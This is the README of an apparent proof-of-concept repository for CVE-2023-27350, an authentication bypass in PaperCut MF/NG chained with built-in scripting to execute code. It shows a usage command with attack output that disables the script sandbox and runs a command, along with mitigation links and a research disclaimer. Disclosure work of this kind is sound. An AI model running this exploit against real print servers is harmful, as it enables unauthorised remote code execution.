# CVE-2023-27350
This is an accompanying content for DarkRelay's detailed write up of the CVE-2023-27350. You can read more on the topic in this [cybersecurity blog](https://www.darkrelay.com/post/cve-2023-27350-papercut-print-management-remote-bypass). <br>

This repository is a POC for CVE-2023-27350 affecting PaperCut MF/NG.

## Technical Analysis
A technical root cause analysis of the vulnerability, indicators of compromise, and internet exposure can be found in the blog:
https://www.darkrelay.com/post/cve-2023-27350-papercut-print-management-remote-bypass 

## Summary
This POC uses an authentication bypass vulnerability chained with abuse of builtin scripting functionality to execute code.

## Usage
```plaintext
python3 CVE-2023-27350.py --url 'http://10.0.40.56:9191' --command calc.exe
[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
[*] Updating print-and-device.script.enabled to Y
[*] Updating print.script.sandboxed to N
[*] Prepparing to execute...
[+] Executed successfully!
[*] Updating print-and-device.script.enabled to N
[*] Updating print.script.sandboxed to Y
```

## Mitigations
Update to the latest version or mitigate by following the instructions within the PaperCut Security Advisory
* https://www.papercut.com/kb/Main/PO-1216-and-PO-1219

## Disclaimer
This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized. Project maintainers are not responsible or liable for misuse of the software. Use responsibly. The orignal content was published by [Horizon3 Attack Team](https://twitter.com/Horizon3Attack)
